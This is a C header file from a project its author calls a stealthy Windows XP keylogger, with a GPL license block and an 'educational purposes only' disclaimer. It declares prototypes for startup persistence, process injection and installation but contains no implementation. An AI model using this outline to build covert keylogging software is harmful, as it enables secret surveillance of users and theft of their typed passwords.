
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.




#ifndef LTS_STUB__H_ 
#define LTS_STUB__H_ 

#include <windows.h> 

typedef enum PROC_TYPE_ { SPAWN, RUNNING } PROC_TYPE; 
typedef enum OS_PLATFORM_ { PLAT_ERROR, PLAT_9X, PLAT_NT } OS_PLATFORM; 
int ImplementDefaultStartup(); 
DWORD run(const char* const, char); 
int Inject(const char* const, DWORD); 
DWORD InjectionProcessId(const char* const, PROC_TYPE); 
int Installation(const char* const); 

#endif 


